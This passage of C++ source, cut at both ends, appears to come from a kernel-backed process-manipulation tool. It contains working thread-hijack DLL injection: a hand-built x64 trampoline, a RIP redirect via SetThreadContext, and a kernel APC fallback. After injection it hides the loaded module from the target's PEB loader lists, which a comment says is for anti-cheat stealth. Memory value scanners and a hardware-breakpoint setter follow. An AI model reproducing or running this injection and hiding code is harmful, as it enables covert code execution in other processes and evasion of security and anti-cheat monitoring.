//   mov rcx,pathVa; mov rax,LoadLibraryA; call rax
//   mov rsp,rbx; restore GPRs; popfq; mov rax,origRip; jmp rax
// Returns total byte count.
static size_t BuildHijackTrampoline(uint8_t* out, uint64_t pathVa,
                                    uint64_t loadLibraryA, uint64_t origRip) {
    size_t o = 0;
    out[o++] = 0x9C;                                                  // pushfq
    // push rax,rbx,rcx,rdx
    out[o++] = 0x50; out[o++] = 0x53; out[o++] = 0x51; out[o++] = 0x52;
    // push r8,r9,r10,r11
    out[o++] = 0x41; out[o++] = 0x50; out[o++] = 0x41; out[o++] = 0x51;
    out[o++] = 0x41; out[o++] = 0x52; out[o++] = 0x41; out[o++] = 0x53;
    // push rbp,rsi,rdi
    out[o++] = 0x55; out[o++] = 0x56; out[o++] = 0x57;
    // push r12,r13,r14,r15
    out[o++] = 0x41; out[o++] = 0x54; out[o++] = 0x41; out[o++] = 0x55;
    out[o++] = 0x41; out[o++] = 0x56; out[o++] = 0x41; out[o++] = 0x57;
    // mov rbx, rsp                              (48 89 E3)
    out[o++] = 0x48; out[o++] = 0x89; out[o++] = 0xE3;
    // and rsp, -16                              (48 83 E4 F0)
    out[o++] = 0x48; out[o++] = 0x83; out[o++] = 0xE4; out[o++] = 0xF0;
    // sub rsp, 0x20                             (48 83 EC 20)
    out[o++] = 0x48; out[o++] = 0x83; out[o++] = 0xEC; out[o++] = 0x20;
    // mov rcx, pathVa
    out[o++] = 0x48; out[o++] = 0xB9;
    std::memcpy(out + o, &pathVa, 8); o += 8;
    // mov rax, LoadLibraryA
    out[o++] = 0x48; out[o++] = 0xB8;
    std::memcpy(out + o, &loadLibraryA, 8); o += 8;
    // call rax                                  (FF D0)
    out[o++] = 0xFF; out[o++] = 0xD0;
    // mov rsp, rbx                              (48 89 DC)
    out[o++] = 0x48; out[o++] = 0x89; out[o++] = 0xDC;
    // pop r15,r14,r13,r12
    out[o++] = 0x41; out[o++] = 0x5F; out[o++] = 0x41; out[o++] = 0x5E;
    out[o++] = 0x41; out[o++] = 0x5D; out[o++] = 0x41; out[o++] = 0x5C;
    // pop rdi,rsi,rbp
    out[o++] = 0x5F; out[o++] = 0x5E; out[o++] = 0x5D;
    // pop r11,r10,r9,r8
    out[o++] = 0x41; out[o++] = 0x5B; out[o++] = 0x41; out[o++] = 0x5A;
    out[o++] = 0x41; out[o++] = 0x59; out[o++] = 0x41; out[o++] = 0x58;
    // pop rdx,rcx,rbx,rax
    out[o++] = 0x5A; out[o++] = 0x59; out[o++] = 0x5B; out[o++] = 0x58;
    out[o++] = 0x9D;                                                  // popfq
    // mov rax, origRip
    out[o++] = 0x48; out[o++] = 0xB8;
    std::memcpy(out + o, &origRip, 8); o += 8;
    // jmp rax                                   (FF E0)
    out[o++] = 0xFF; out[o++] = 0xE0;
    return o;
}

// Thread-hijack injection: suspend a victim thread, redirect RIP to a
// context-preserving trampoline that calls LoadLibraryA and jumps back to
// the original RIP. Does not require alertable wait (unlike KAPC).
// Trampoline must be written *after* originalRip is patched in — that
// requires SuspendThread + GetThreadContext first.
static bool HijackThreadAndCall(AsioProvider& kernel, uint64_t eprocess,
                                uint64_t cr3, DWORD pid,
                                uint64_t trampVa, uint64_t pathVa,
                                uint64_t loadLibraryA) {
    std::vector<DWORD> tids = EnumerateProcessThreads(pid);
    if (tids.empty()) {
        std::wcerr << L"[-] HijackThreadAndCall: no candidate threads" << std::endl;
        return false;
    }

    // Pre-commit the trampoline page by writing a placeholder. Freshly
    // ZwAllocate'd pages are demand-zero — TargetVtoP returns false until
    // the page has been faulted in. WriteTargetMemViaAttachedMemcpy uses
    // KeStackAttach + memcpy which forces the page fault server-side.
    {
        uint8_t placeholder[128]{};
        const size_t pSize = BuildHijackTrampoline(placeholder, pathVa, loadLibraryA, 0);
        if (!WriteTargetMemViaAttachedMemcpy(kernel, eprocess, trampVa, placeholder, pSize)) {
            std::wcerr << L"[-] HijackThreadAndCall: placeholder trampoline write failed" << std::endl;
            return false;
        }
    }

    for (DWORD victimTid : tids) {
        HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT |
                                        THREAD_SET_CONTEXT,
                                    FALSE, victimTid);
        if (!hThread) continue;

        if (SuspendThread(hThread) == (DWORD)-1) {
            CloseHandle(hThread);
            continue;
        }

        CONTEXT ctx{};
        ctx.ContextFlags = CONTEXT_CONTROL;
        if (!GetThreadContext(hThread, &ctx)) {
            ResumeThread(hThread);
            CloseHandle(hThread);
            continue;
        }

        const uint64_t originalRip = ctx.Rip;

        // Re-write trampoline with real originalRip via attached-memcpy
        // (handles demand-zero / paged-out trampoline page reliably).
        uint8_t tramp[128]{};
        const size_t trampLen = BuildHijackTrampoline(tramp, pathVa,
                                                     loadLibraryA, originalRip);
        if (!WriteTargetMemViaAttachedMemcpy(kernel, eprocess, trampVa, tramp, trampLen)) {
            std::wcerr << L"[-] HijackThreadAndCall: trampoline rewrite failed" << std::endl;
            ResumeThread(hThread);
            CloseHandle(hThread);
            return false;
        }

        ctx.Rip = trampVa;
        if (!SetThreadContext(hThread, &ctx)) {
            std::wcerr << L"[-] HijackThreadAndCall: SetThreadContext failed tid=" << victimTid << std::endl;
            ResumeThread(hThread);
            CloseHandle(hThread);
            continue;
        }

        ResumeThread(hThread);
        CloseHandle(hThread);

        std::wcout << L"[+] INJECT_DLL thread hijack: tid=" << victimTid
                   << L" originalRip=0x" << std::hex << originalRip
                   << L" hijackTo=0x" << trampVa
                   << L" trampLen=" << std::dec << trampLen << std::endl;
        return true;
    }

    std::wcerr << L"[-] HijackThreadAndCall: all thread candidates failed" << std::endl;
    return false;
}

static int32_t HandleInjectDll(AsioProvider& kernel, PipeSession& s,
                               const std::vector<uint8_t>& payload, uint64_t& outRemoteBase) {
    if (s.eprocess == 0 || s.pid == 0) return ASIO_ERR_NOT_ATTACHED;
    if (payload.size() < sizeof(uint16_t)) return ASIO_ERR_BAD_PAYLOAD;

    const uint16_t pathLen = *reinterpret_cast<const uint16_t*>(payload.data());
    if (!pathLen || pathLen > 0x800) return ASIO_ERR_BAD_PAYLOAD;
    if (payload.size() < sizeof(uint16_t) + pathLen) return ASIO_ERR_BAD_PAYLOAD;

    // Path is UTF-8 on the wire; build both wide (for logging) and ANSI
    // (LoadLibraryA wants a single-byte char*) representations.
    const char* utf8 = reinterpret_cast<const char*>(payload.data()) + sizeof(uint16_t);
    const int wlen = MultiByteToWideChar(CP_UTF8, 0, utf8, pathLen, nullptr, 0);
    if (wlen <= 0) return ASIO_ERR_BAD_PAYLOAD;
    std::wstring widePath(static_cast<size_t>(wlen), L'\0');
    MultiByteToWideChar(CP_UTF8, 0, utf8, pathLen, widePath.data(), wlen);

    const int alen = WideCharToMultiByte(CP_ACP, 0, widePath.c_str(), wlen,
                                         nullptr, 0, nullptr, nullptr);
    if (alen <= 0) return ASIO_ERR_BAD_PAYLOAD;
    std::string ansiPath(static_cast<size_t>(alen), '\0');
    WideCharToMultiByte(CP_ACP, 0, widePath.c_str(), wlen,
                        ansiPath.data(), alen, nullptr, nullptr);
    // Make sure there is a trailing NUL byte in the buffer we copy across.
    ansiPath.push_back('\0');
    const size_t pathBufSize = ansiPath.size();

    // 1) PEB of target.
    const uint64_t peb = ReadTargetPeb(kernel, s.eprocess);
    if (!peb) {
        std::wcerr << L"[-] INJECT_DLL: ReadTargetPeb failed" << std::endl;
        return ASIO_ERR_INTERNAL;
    }

    // Set eprocess scope so PEB walks can fall back to MDL on paged-out pages.
    TargetEprocessScope _pebScope(s.eprocess);

    // 2) Locate kernel32.dll in target and resolve LoadLibraryA.
    uint64_t kernel32Base = ResolveTargetModuleBase(kernel, s.cr3, peb, "KERNEL32.DLL");
    if (!kernel32Base) {
        // try lowercase fallback
        kernel32Base = ResolveTargetModuleBase(kernel, s.cr3, peb, "kernel32.dll");
    }
    if (!kernel32Base) {
        // last resort: enumerate and search
        std::vector<TargetUserModule> mods;
        if (EnumerateTargetUserModules(kernel, s.cr3, peb, mods)) {
            for (const auto& m : mods) {
                std::string lower = m.Name;
                std::transform(lower.begin(), lower.end(), lower.begin(),
                               [](char c) { return (char)tolower((unsigned char)c); });
                if (lower.find("kernel32") != std::string::npos &&
                    lower.find(".dll") != std::string::npos) {
                    kernel32Base = m.Base;
                    std::wcout << L"[*] INJECT_DLL: kernel32 located via enum: 0x"
                               << std::hex << kernel32Base << std::dec << std::endl;
                    break;
                }
            }
        }
    }
    if (!kernel32Base) {
        std::wcerr << L"[-] INJECT_DLL: kernel32.dll not loaded in target" << std::endl;
        return ASIO_ERR_RESOLVE;
    }
    const uint64_t loadLibraryA = ResolveTargetExport(kernel, s.cr3, peb,
                                                     kernel32Base, "LoadLibraryA", 0);
    if (!loadLibraryA) {
        std::wcerr << L"[-] INJECT_DLL: LoadLibraryA not resolved in target" << std::endl;
        return ASIO_ERR_RESOLVE;
    }

    // 3) Allocate path buffer (RW) and trampoline buffer (RWX) in target.
    constexpr uint32_t kPageReadWrite = 0x04;
    constexpr uint32_t kPageExecuteReadWrite = 0x40;
    const uint64_t pathVa = AllocateTargetUserMem(kernel, s.eprocess,
                                                  pathBufSize, kPageReadWrite);
    if (!pathVa) {
        std::wcerr << L"[-] INJECT_DLL: alloc path buffer failed" << std::endl;
        return ASIO_ERR_INTERNAL;
    }
    if (!WriteTargetMem(kernel, s.cr3, pathVa, ansiPath.data(), pathBufSize)) {
        std::wcerr << L"[-] INJECT_DLL: write path buffer failed" << std::endl;
        return ASIO_ERR_INTERNAL;
    }

    const uint64_t trampVa = AllocateTargetUserMem(kernel, s.eprocess,
                                                   0x100, kPageExecuteReadWrite);
    if (!trampVa) {
        std::wcerr << L"[-] INJECT_DLL: alloc trampoline failed" << std::endl;
        return ASIO_ERR_INTERNAL;
    }

    // 4) Thread hijack: suspend victim, get RIP, write context-preserving
    //    trampoline (LoadLibraryA + jmp originalRip), set new RIP, resume.
    //    This does not require an alertable wait (unlike KAPC).
    bool injectOk = HijackThreadAndCall(kernel, s.eprocess, s.cr3, s.pid,
                                        trampVa, pathVa, loadLibraryA);
    if (!injectOk) {
        std::wcerr << L"[!] INJECT_DLL: hijack failed, falling back to KAPC" << std::endl;
        // Fallback: build classic 31-byte trampoline + KAPC.
        uint8_t tramp[31];
        size_t o = 0;
        tramp[o++] = 0x48; tramp[o++] = 0xB9;
        std::memcpy(tramp + o, &pathVa, 8); o += 8;
        tramp[o++] = 0x48; tramp[o++] = 0xB8;
        std::memcpy(tramp + o, &loadLibraryA, 8); o += 8;
        tramp[o++] = 0x48; tramp[o++] = 0x83; tramp[o++] = 0xEC; tramp[o++] = 0x28;
        tramp[o++] = 0xFF; tramp[o++] = 0xD0;
        tramp[o++] = 0x48; tramp[o++] = 0x83; tramp[o++] = 0xC4; tramp[o++] = 0x28;
        tramp[o++] = 0xC3;
        if (!WriteTargetMemViaAttachedMemcpy(kernel, s.eprocess, trampVa, tramp, sizeof(tramp))) {
            std::wcerr << L"[-] INJECT_DLL: fallback trampoline write failed" << std::endl;
            return ASIO_ERR_INTERNAL;
        }
        const auto tids = EnumerateProcessThreads(s.pid);
        if (tids.empty() || !TriggerDllMainViaR0Apc(kernel, s.pid, tids, trampVa, 0)) {
            std::wcerr << L"[-] INJECT_DLL: fallback KAPC trigger failed" << std::endl;
            return ASIO_ERR_INTERNAL;
        }
    }

    // LoadLibraryA returns the module base async via KAPC; we don't have it
    // here. Report LoadLibraryA address for diagnostics.
    outRemoteBase = loadLibraryA;
    std::wcout << L"[+] INJECT_DLL ok (LoadLibraryA path): pid=" << s.pid
               << L" trampoline=0x" << std::hex << trampVa
               << L" pathVa=0x" << pathVa
               << L" LoadLibraryA=0x" << loadLibraryA << std::dec
               << L" path=" << widePath << std::endl;

    // --- PEB Ldr 4-list unlink for anti-cheat stealth ----------------------
    // The OS loader (when LoadLibrary path is used) registers the module in
    // four linked lists hanging off PEB.Ldr. Manual-map paths typically
    // don't register, in which case HidePebLdrEntry will simply find no
    // matching entry and no-op. We give LoadLibraryA a brief window to
    // finish (KAPC is async), then re-walk the LDR by image basename and
    // unlink. The OS loader has already finished init by then, so removing
    // the bookkeeping is safe.
    Sleep(500);
    if (s.cr3 && s.eprocess) {
        const uint64_t hidePeb = ReadTargetPeb(kernel, s.eprocess);
        if (hidePeb) {
            // basename of widePath (after last \ or /)
            std::wstring base = widePath;
            const size_t slash = base.find_last_of(L"\\/");
            if (slash != std::wstring::npos) base = base.substr(slash + 1);
            std::wstring baseLower = base;
            std::transform(baseLower.begin(), baseLower.end(), baseLower.begin(),
                           [](wchar_t c) { return (wchar_t)towlower(c); });
            const std::string baseLowerUtf8 = WideToUtf8(baseLower);

            TargetEprocessScope hideScope(s.eprocess);
            std::vector<TargetUserModule> modules;
            if (EnumerateTargetUserModules(kernel, s.cr3, hidePeb, modules)) {
                for (const auto& m : modules) {
                    std::string nameLower = m.Name;
                    std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(),
                                   [](char c) { return (char)tolower((unsigned char)c); });
                    if (!baseLowerUtf8.empty() &&
                        nameLower.find(baseLowerUtf8) != std::string::npos) {
                        std::wcout << L"[+] INJECT_DLL hiding from PEB Ldr: base=0x"
                                   << std::hex << m.Base << std::dec
                                   << L" name=" << base << std::endl;
                        HidePebLdrEntry(kernel, s.eprocess, s.cr3, hidePeb, m.Base);
                        break;
                    }
                }
            } else {
                std::wcout << L"[!] INJECT_DLL PEB Ldr enum returned empty — "
                              L"manual-map path, nothing to unlink" << std::endl;
            }
        }
    }
    return ASIO_OK;
}


static int32_t HandleScanAob(AsioProvider& kernel, PipeSession& s,
                             const std::vector<uint8_t>& payload,
                             std::vector<uint8_t>& outBytes) {
    if (s.eprocess == 0 || s.pid == 0) return ASIO_ERR_NOT_ATTACHED;
    if (payload.size() < sizeof(AsioR0ScanAobReq)) return ASIO_ERR_BAD_PAYLOAD;

    const auto* req = reinterpret_cast<const AsioR0ScanAobReq*>(payload.data());
    const uint16_t patLen = req->pattern_len;
    const uint16_t mskLen = req->mask_len;

    if (patLen == 0 || patLen > 256) return ASIO_ERR_BAD_PAYLOAD;
    if (mskLen != patLen) return ASIO_ERR_BAD_PAYLOAD;
    if (req->range_end <= req->range_start) return ASIO_ERR_BAD_PAYLOAD;
    if (req->alignment != 1 && req->alignment != 4 && req->alignment != 8) {
        return ASIO_ERR_BAD_PAYLOAD;
    }
    if (payload.size() < sizeof(AsioR0ScanAobReq) + static_cast<size_t>(patLen) + mskLen) {
        return ASIO_ERR_BAD_PAYLOAD;
    }

    constexpr uint32_t kMaxHitsCap = 1u << 20;   // 1M hits = 8 MiB
    uint32_t maxHits = req->max_hits;
    if (maxHits == 0 || maxHits > kMaxHitsCap) maxHits = kMaxHitsCap;

    const uint8_t* pattern = payload.data() + sizeof(AsioR0ScanAobReq);
    const uint8_t* mask    = pattern + patLen;
    const uint32_t alignment = req->alignment;
    const uint64_t rangeStart = req->range_start;
    const uint64_t rangeEnd   = req->range_end;

    constexpr size_t kChunkSize = 1u << 20;      // 1 MiB
    std::vector<uint8_t> chunk(kChunkSize);
    std::vector<uint64_t> hits;
    hits.reserve(64);
    uint32_t truncated = 0;

    uint64_t cur = rangeStart;
    while (cur < rangeEnd) {
        const uint64_t remaining = rangeEnd - cur;
        size_t want = remaining < kChunkSize ? static_cast<size_t>(remaining) : kChunkSize;
        // Overlap pattern_len-1 bytes between chunks so cross-chunk matches
        // are not missed. Last chunk (cur+want == rangeEnd) needs no overlap.
        const size_t overlap = (cur + want < rangeEnd) ? static_cast<size_t>(patLen - 1) : 0u;

        bool readOk = ReadTargetMem(kernel, s.cr3, cur, chunk.data(), want);
        if (!readOk) {
            // Degrade to MDL path one shot (capped at 1 MiB already).
            readOk = ReadTargetMemViaMdl(kernel, s.eprocess, s.cr3, cur, chunk.data(), want);
        }

        if (readOk) {
            const size_t scanEnd = (want >= patLen) ? (want - patLen + 1) : 0u;
            for (size_t off = 0; off < scanEnd; off += alignment) {
                bool match = true;
                for (uint16_t i = 0; i < patLen; ++i) {
                    // Equivalent to: (chunk[off+i] & mask[i]) == (pattern[i] & mask[i])
                    if (mask[i] != 0 && chunk[off + i] != pattern[i]) {
                        match = false;
                        break;
                    }
                }
                if (match) {
                    hits.push_back(cur + off);
                    if (hits.size() >= maxHits) {
                        truncated = 1;
                        break;
                    }
                }
            }
            if (truncated) break;
        }
        // Skip unmappable region (CE semantics) and advance.
        if (want <= overlap) break;  // defensive: pattern too large for remaining
        cur += (want - overlap);
    }

    const uint32_t hitCount = static_cast<uint32_t>(hits.size());
    outBytes.resize(sizeof(AsioR0ScanAobResp) + hitCount * sizeof(uint64_t));
    auto* resp = reinterpret_cast<AsioR0ScanAobResp*>(outBytes.data());
    resp->hit_count = hitCount;
    resp->truncated = truncated;
    if (hitCount) {
        std::memcpy(outBytes.data() + sizeof(AsioR0ScanAobResp),
                    hits.data(), hitCount * sizeof(uint64_t));
    }

    std::wcout << L"[+] SCAN_AOB pid=" << s.pid
               << L" range=0x" << std::hex << rangeStart << L"-0x" << rangeEnd
               << L" pattern_len=" << std::dec << patLen
               << L" max_hits=" << maxHits
               << L" hit_count=" << hitCount
               << L" truncated=" << truncated << std::endl;

    return ASIO_OK;
}


// Compare helpers for typed value scans. Integer comparisons use unsigned
// semantics; float/double EQ uses an epsilon of 1e-3 to match CE's "rounded"
// float scan behavior.
static bool AsioScanValueMatch(uint8_t valueType, uint8_t scanOp,
                               uint64_t cur, uint64_t prev,
                               uint64_t valLo, uint64_t valHi,
                               bool usePrev)
{
    constexpr double kFloatEps = 1e-3;
    switch (valueType) {
    case ASIO_SCAN_T_FLOAT: {
        float c, p, lo, hi;
        std::memcpy(&c,  &cur,   sizeof(float));
        std::memcpy(&p,  &prev,  sizeof(float));
        std::memcpy(&lo, &valLo, sizeof(float));
        std::memcpy(&hi, &valHi, sizeof(float));
        switch (scanOp) {
        case ASIO_SCAN_OP_EQ:        return (double)std::fabs(c - lo) < kFloatEps;
        case ASIO_SCAN_OP_NEQ:       return (double)std::fabs(c - lo) >= kFloatEps;
        case ASIO_SCAN_OP_GT:        return c > lo;
        case ASIO_SCAN_OP_LT:        return c < lo;
        case ASIO_SCAN_OP_GE:        return c >= lo;
        case ASIO_SCAN_OP_LE:        return c <= lo;
        case ASIO_SCAN_OP_RANGE:     return c >= lo && c <= hi;
        case ASIO_SCAN_OP_CHANGED:   return usePrev && (double)std::fabs(c - p) >= kFloatEps;
        case ASIO_SCAN_OP_UNCHANGED: return usePrev && (double)std::fabs(c - p) < kFloatEps;
        case ASIO_SCAN_OP_INCREASED: return usePrev && c > p;
        case ASIO_SCAN_OP_DECREASED: return usePrev && c < p;
        }
        return false;
    }
    case ASIO_SCAN_T_DOUBLE: {
        double c, p, lo, hi;
        std::memcpy(&c,  &cur,   sizeof(double));
        std::memcpy(&p,  &prev,  sizeof(double));
        std::memcpy(&lo, &valLo, sizeof(double));
        std::memcpy(&hi, &valHi, sizeof(double));
        switch (scanOp) {
        case ASIO_SCAN_OP_EQ:        return std::fabs(c - lo) < kFloatEps;
        case ASIO_SCAN_OP_NEQ:       return std::fabs(c - lo) >= kFloatEps;
        case ASIO_SCAN_OP_GT:        return c > lo;
        case ASIO_SCAN_OP_LT:        return c < lo;
        case ASIO_SCAN_OP_GE:        return c >= lo;
        case ASIO_SCAN_OP_LE:        return c <= lo;
        case ASIO_SCAN_OP_RANGE:     return c >= lo && c <= hi;
        case ASIO_SCAN_OP_CHANGED:   return usePrev && std::fabs(c - p) >= kFloatEps;
        case ASIO_SCAN_OP_UNCHANGED: return usePrev && std::fabs(c - p) < kFloatEps;
        case ASIO_SCAN_OP_INCREASED: return usePrev && c > p;
        case ASIO_SCAN_OP_DECREASED: return usePrev && c < p;
        }
        return false;
    }
    default:
        // Unsigned integer comparison for BYTE/WORD/DWORD/QWORD.
        switch (scanOp) {
        case ASIO_SCAN_OP_EQ:        return cur == valLo;
        case ASIO_SCAN_OP_NEQ:       return cur != valLo;
        case ASIO_SCAN_OP_GT:        return cur >  valLo;
        case ASIO_SCAN_OP_LT:        return cur <  valLo;
        case ASIO_SCAN_OP_GE:        return cur >= valLo;
        case ASIO_SCAN_OP_LE:        return cur <= valLo;
        case ASIO_SCAN_OP_RANGE:     return cur >= valLo && cur <= valHi;
        case ASIO_SCAN_OP_CHANGED:   return usePrev && cur != prev;
        case ASIO_SCAN_OP_UNCHANGED: return usePrev && cur == prev;
        case ASIO_SCAN_OP_INCREASED: return usePrev && cur >  prev;
        case ASIO_SCAN_OP_DECREASED: return usePrev && cur <  prev;
        }
        return false;
    }
}

static uint32_t AsioScanValueSize(uint8_t t) {
    switch (t) {
    case ASIO_SCAN_T_BYTE:   return 1;
    case ASIO_SCAN_T_WORD:   return 2;
    case ASIO_SCAN_T_DWORD:  return 4;
    case ASIO_SCAN_T_QWORD:  return 8;
    case ASIO_SCAN_T_FLOAT:  return 4;
    case ASIO_SCAN_T_DOUBLE: return 8;
    default: return 0;
    }
}

static uint64_t AsioScanReadValue(const uint8_t* p, uint32_t size) {
    uint64_t v = 0;
    std::memcpy(&v, p, size);
    return v;
}

static int32_t HandleScanValue(AsioProvider& kernel, PipeSession& s,
                               const std::vector<uint8_t>& payload,
                               std::vector<uint8_t>& outBytes) {
    if (s.eprocess == 0 || s.pid == 0) return ASIO_ERR_NOT_ATTACHED;
    if (payload.size() < sizeof(AsioR0ScanValueReq)) return ASIO_ERR_BAD_PAYLOAD;

    const auto* req = reinterpret_cast<const AsioR0ScanValueReq*>(payload.data());
    const uint32_t valueSize = AsioScanValueSize(req->value_type);
    if (valueSize == 0) return ASIO_ERR_BAD_PAYLOAD;
    if (req->range_end <= req->range_start) return ASIO_ERR_BAD_PAYLOAD;

    const uint32_t alignment = req->alignment;
    if (alignment != 1 && alignment != 2 && alignment != 4 && alignment != 8) {
        return ASIO_ERR_BAD_PAYLOAD;
    }
    // alignment must be 1 or >= valueSize (CE behavior).
    if (alignment != 1 && alignment < valueSize) return ASIO_ERR_BAD_PAYLOAD;

    // First scan supports comparison-with-value ops only.
    const uint8_t op = req->scan_op;
    if (op > ASIO_SCAN_OP_RANGE) return ASIO_ERR_BAD_PAYLOAD;

    constexpr uint32_t kMaxHitsCap = 1u << 20;
    uint32_t maxHits = req->max_hits;
    if (maxHits == 0 || maxHits > kMaxHitsCap) maxHits = kMaxHitsCap;

    const uint64_t rangeStart = req->range_start;
    const uint64_t rangeEnd   = req->range_end;
    const uint64_t valLo      = req->value_lo;
    const uint64_t valHi      = req->value_hi;

    constexpr size_t kChunkSize = 1u << 20;
    std::vector<uint8_t> chunk(kChunkSize);
    std::vector<PipeSession::ScanResult> hits;
    hits.reserve(64);
    uint32_t truncated = 0;

    uint64_t cur = rangeStart;
    while (cur < rangeEnd) {
        const uint64_t remaining = rangeEnd - cur;
        size_t want = remaining < kChunkSize ? static_cast<size_t>(remaining) : kChunkSize;
        const size_t overlap = (cur + want < rangeEnd) ? static_cast<size_t>(valueSize - 1) : 0u;

        bool readOk = ReadTargetMem(kernel, s.cr3, cur, chunk.data(), want);
        if (!readOk) {
            readOk = ReadTargetMemViaMdl(kernel, s.eprocess, s.cr3, cur, chunk.data(), want);
        }

        if (readOk && want >= valueSize) {
            const size_t scanEnd = want - valueSize + 1;
            for (size_t off = 0; off < scanEnd; off += alignment) {
                const uint64_t curVal = AsioScanReadValue(chunk.data() + off, valueSize);
                if (AsioScanValueMatch(req->value_type, op, curVal, 0, valLo, valHi, false)) {
                    hits.push_back({ cur + off, curVal });
                    if (hits.size() >= maxHits) {
                        truncated = 1;
                        break;
                    }
                }
            }
            if (truncated) break;
        }
        if (want <= overlap) break;
        cur += (want - overlap);
    }

    s.scanResults = hits;
    s.scanValueType = req->value_type;

    const uint32_t hitCount = static_cast<uint32_t>(hits.size());
    outBytes.resize(sizeof(AsioR0ScanValueResp) + hitCount * sizeof(uint64_t));
    auto* resp = reinterpret_cast<AsioR0ScanValueResp*>(outBytes.data());
    resp->hit_count = hitCount;
    resp->truncated = truncated;
    if (hitCount) {
        uint8_t* outVa = outBytes.data() + sizeof(AsioR0ScanValueResp);
        for (uint32_t i = 0; i < hitCount; ++i) {
            std::memcpy(outVa + i * sizeof(uint64_t), &hits[i].va, sizeof(uint64_t));
        }
    }

    std::wcout << L"[+] SCAN_VALUE pid=" << s.pid
               << L" range=0x" << std::hex << rangeStart << L"-0x" << rangeEnd
               << L" type=" << std::dec << (int)req->value_type
               << L" op=" << (int)op
               << L" align=" << alignment
               << L" hits=" << hitCount
               << L" truncated=" << truncated << std::endl;

    return ASIO_OK;
}


static int32_t HandleScanNext(AsioProvider& kernel, PipeSession& s,
                              const std::vector<uint8_t>& payload,
                              std::vector<uint8_t>& outBytes) {
    if (s.eprocess == 0 || s.pid == 0) return ASIO_ERR_NOT_ATTACHED;
    if (payload.size() < sizeof(AsioR0ScanNextReq)) return ASIO_ERR_BAD_PAYLOAD;
    if (s.scanResults.empty()) return ASIO_ERR_BAD_PAYLOAD;

    const auto* req = reinterpret_cast<const AsioR0ScanNextReq*>(payload.data());
    const uint8_t op = req->scan_op;
    if (op > ASIO_SCAN_OP_DECREASED) return ASIO_ERR_BAD_PAYLOAD;

    const uint32_t valueSize = AsioScanValueSize(s.scanValueType);
    if (valueSize == 0) return ASIO_ERR_BAD_PAYLOAD;

    const uint64_t valLo = req->value_lo;
    const uint64_t valHi = req->value_hi;

    std::vector<PipeSession::ScanResult> newResults;
    newResults.reserve(s.scanResults.size());

    uint8_t buf[8] = {};
    for (const auto& entry : s.scanResults) {
        bool readOk = ReadTargetMem(kernel, s.cr3, entry.va, buf, valueSize);
        if (!readOk) {
            readOk = ReadTargetMemViaMdl(kernel, s.eprocess, s.cr3, entry.va, buf, valueSize);
        }
        if (!readOk) continue;

        const uint64_t curVal = AsioScanReadValue(buf, valueSize);
        if (AsioScanValueMatch(s.scanValueType, op, curVal, entry.prev_value,
                               valLo, valHi, true)) {
            newResults.push_back({ entry.va, curVal });
        }
    }

    s.scanResults = std::move(newResults);

    const uint32_t hitCount = static_cast<uint32_t>(s.scanResults.size());
    outBytes.resize(sizeof(AsioR0ScanValueResp) + hitCount * sizeof(uint64_t));
    auto* resp = reinterpret_cast<AsioR0ScanValueResp*>(outBytes.data());
    resp->hit_count = hitCount;
    resp->truncated = 0;
    if (hitCount) {
        uint8_t* outVa = outBytes.data() + sizeof(AsioR0ScanValueResp);
        for (uint32_t i = 0; i < hitCount; ++i) {
            std::memcpy(outVa + i * sizeof(uint64_t),
                        &s.scanResults[i].va, sizeof(uint64_t));
        }
    }

    std::wcout << L"[+] SCAN_NEXT pid=" << s.pid
               << L" type=" << std::dec << (int)s.scanValueType
               << L" op=" << (int)op
               << L" hits=" << hitCount << std::endl;

    return ASIO_OK;
}


static int32_t HandleHwbpSet(AsioProvider& kernel, PipeSession& s,
                              const std::vector<uint8_t>& payload) {
    (void)kernel;
    if (s.eprocess == 0) return ASIO_ERR_NOT_ATTACHED;
    if (payload.size() < sizeof(AsioR0HwbpSetReq)) return ASIO_ERR_BAD_PAYLOAD;
    const auto* req = reinterpret_cast<const AsioR0HwbpSetReq*>(payload.data());
    if (req->dr_index > 3) return ASIO_ERR_BAD_PAYLOAD;
    if (req->length != 1 && req->length != 2 && req->length != 4 && req->length != 8)
        return ASIO_ERR_BAD_PAYLOAD;
    if (req->condition != ASIO_HWBP_COND_EXEC &&
        req->condition != ASIO_HWBP_COND_WRITE &&
        req->condition != ASIO_HWBP_COND_ACCESS)
        return ASIO_ERR_BAD_PAYLOAD;
    if (!req->va) return ASIO_ERR_BAD_PAYLOAD;

    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                                 FALSE, req->tid);
    if (!hThread) return ASIO_ERR_RESOLVE;

    DWORD prev = SuspendThread(hThread);
    if (prev == (DWORD)-1) { CloseHandle(hThread); return ASIO_ERR_INTERNAL; }

    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(hThread, &ctx)) {
        ResumeThread(hThread); CloseHandle(hThread); return ASIO_ERR_INTERNAL;
    }

    DWORD64* drs[] = { &ctx.Dr0, &ctx.Dr1, &ctx.Dr2, &ctx.Dr3 };
    *drs[req->dr_index] = req->va;

    const uint8_t i = req->dr_index;
    DWORD64 dr7 = ctx.Dr7;
    dr7 &= ~((DWORD64)1 << (2 * i));                       // clear L<i>
    dr7 &= ~((DWORD64)0xF << (16 + 4 * i));                // clear RW<i>/LEN<i>
    dr7 |= (DWORD64)1 << (2 * i);                          // set L<i>

    DWORD64 rwBits = (DWORD64)(req->condition & 0x3);      // 00 exec, 01 write, 11 access
    DWORD64 lenCode = 0;
    switch (req->length) {
        case 1: lenCode = 0x0; break;   // 00
        case 2: lenCode = 0x1; break;   // 01
        case 4: lenCode = 0x3; break;   // 11
        case 8: lenCode = 0x2; break;   // 10
    }
    dr7 |= (rwBits << (16 + 4 * i)) | (lenCode << (16 + 4 * i + 2));
    ctx.Dr7 = dr7;

    if (!SetThreadContext(hThread, &ctx)) {
        ResumeThread(hThread); CloseHandle(hThread); return ASIO_ERR_INTERNAL;
    }
    ResumeThread(hThread);
    CloseHandle(hThread);

    std::wcout << L"[+] HWBP set: tid=" << req->tid << L" dr=" << (int)req->dr_index
               << L" va=0x" << std::hex << req->va << L" cond=" << std::dec << (int)req->condition
               << L" len=" << (int)req->length << std::endl;
    return ASIO_OK;
}

static int32_t HandleHwbpClear(AsioProvider& kernel, PipeSession& s,
                                const std::vector<uint8_t>& payload) {
    (void)kernel;
    if (s.eprocess == 0) return ASIO_ERR_NOT_ATTACHED;
